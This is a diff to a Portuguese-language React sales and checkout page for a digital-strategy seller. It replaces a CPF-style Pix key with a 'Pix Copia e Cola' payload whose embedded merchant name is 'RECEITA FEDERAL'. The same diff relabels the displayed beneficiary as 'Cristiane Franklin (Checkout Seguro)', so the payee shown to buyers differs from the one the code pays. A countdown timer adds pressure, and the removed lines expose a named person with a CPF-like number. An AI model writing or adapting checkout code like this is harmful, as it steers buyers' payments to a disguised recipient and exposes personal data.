@@ -5,17 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cristiane Franklin | Estratégias Digitais</title>
     
-    <!-- Carregando Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     
-    <!-- Carregando React e ReactDOM -->
     <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
     <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
     
-    <!-- Carregando Babel para traduzir o código React no navegador -->
     <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
 
-    <!-- Fontes -->
     <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
     <style>
@@ -33,7 +29,7 @@
     <script type="text/babel">
         const { useState, useEffect } = React;
 
-        // --- Ícones SVG (Substituindo Lucide React para funcionar sem build) ---
+        // --- Ícones SVG ---
         const IconBase = ({ children, size = 24, className = "" }) => (
             <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className={className}>
                 {children}
@@ -77,6 +73,9 @@
             const [isCheckoutOpen, setIsCheckoutOpen] = useState(false);
             const [isPixOpen, setIsPixOpen] = useState(false);
             
+            // Chave PIX Nova
+            const pixCode = "00020101021126530014br.gov.bcb.pix0111081904013430216COMPRA EM PAGUEI5204000053039865406197.005802BR5915RECEITA FEDERAL6010PAGAMENTOS622905255SUCDIFLGIVAIDG4FJJVYWV0G6304712E";
+
             // Estado do Cronômetro
             const [timeLeft, setTimeLeft] = useState(600); // 10 minutos em segundos
 
@@ -190,8 +189,8 @@
             };
 
             const copyPix = () => {
-                navigator.clipboard.writeText("081.904.013-43");
-                alert("Chave PIX copiada!");
+                navigator.clipboard.writeText(pixCode);
+                alert("Código Pix Copia e Cola copiado!");
             };
 
             return (
@@ -513,7 +512,7 @@
                             <div className="space-y-4 text-left bg-neutral-800 p-6 rounded-lg border border-neutral-700">
                                 <div>
                                     <p className="text-gray-400 text-xs uppercase tracking-wider mb-1">Titular Beneficiário</p>
-                                    <p className="text-white font-medium text-lg border-b border-neutral-700 pb-2">Brenda do Nascimento Silveira</p>
+                                    <p className="text-white font-medium text-lg border-b border-neutral-700 pb-2">Cristiane Franklin (Checkout Seguro)</p>
                                 </div>
                                 
                                 <div className="pt-2 text-center">
@@ -528,7 +527,7 @@
                                 <div className="text-left px-2">
                                     <h4 className="text-white font-bold mb-1">Instruções:</h4>
                                     <p className="text-sm text-gray-400">1. Abra o app do seu banco e escolha "Pix".</p>
-                                    <p className="text-sm text-gray-400">2. Escolha a opção "Pagar com CPF".</p>
+                                    <p className="text-sm text-gray-400">2. Escolha a opção "Pix Copia e Cola".</p>
                                     <p className="text-sm text-gray-400">3. Cole a chave abaixo e confira os dados.</p>
                                 </div>
 
@@ -536,8 +535,10 @@
                                     onClick={copyPix}
                                     className="flex items-center justify-between bg-black border-2 border-emerald-600 rounded-lg p-4 cursor-pointer hover:bg-emerald-900/10 transition group shadow-lg shadow-emerald-900/20"
                                 >
-                                    <code className="text-emerald-400 font-mono text-lg font-bold">081.904.013-43</code>
-                                    <div className="flex items-center gap-2 text-gray-400 group-hover:text-white">
+                                    <code className="text-emerald-400 font-mono text-sm font-bold truncate max-w-[250px] sm:max-w-sm block">
+                                        {pixCode}
+                                    </code>
+                                    <div className="flex items-center gap-2 text-gray-400 group-hover:text-white shrink-0 pl-2">
                                         <span className="text-xs font-bold uppercase hidden sm:block">Copiar</span>
                                         <Copy size={20} />
                                     </div>
